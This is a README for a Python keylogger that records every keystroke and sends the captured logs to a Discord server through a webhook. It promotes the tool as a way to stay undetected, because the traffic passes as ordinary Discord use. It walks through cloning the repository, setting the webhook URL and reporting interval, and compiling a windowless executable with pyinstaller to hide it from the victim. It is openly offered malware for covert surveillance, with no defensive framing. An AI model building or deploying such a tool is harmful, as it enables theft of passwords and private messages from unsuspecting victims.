# Keylogger That Reports To Discord #

This super simle keylogger will capture all of the keystrokes within a given time frame and report them to a Discord Server using Webhooks. Instead of the traditional "save to file" or "report to email" methods, you can use this method to stay undetected since webhook requests are considered as normal Discord Traffic.

![image](https://i.ibb.co/LrkQPc3/keylogger.png)

## Getting Started

Make sure you have Python installed on your machine, you download the installer from [here](https://www.python.org/downloads/).

## Clone the repository
```
git clone https://github.com/NoAssosciation/discord-keylogger.git
```
Or you can download the [zip file](https://github.com/NoAssosciation/discord-keylogger/archive/refs/heads/main.zip) from the repository website.

## Install Required Libraries
```
python -m pip install -r requirements.txt
```


## Edit keylogger.py
Edit the script. Now that you have the Webhook URL, you can add that to the file. Also make sure to add your desired timeframe that they keylogger will report to you. You have to add the time in seconds so you can use [this](https://www.calculatorsoup.com/calculators/conversions/time.php) converter to get the correct time in seconds.

```Python
import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed

SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
WEBHOOK = "WEBHOOK_URL_HERE"
```

## Execute the script

To execute the script all you have to do is run:
```
python keylogger.py
```
If all goes right, you should see a report on discord after the seconds you have specified on the script have passed.

## Compile the script

Now what if you want to turn this into an executable? You can do that with the pyinstaller library that was included in the requirements.txt file.
```
pyinstaller PATH_TO_SCRIPT --onefile --noconsole
```

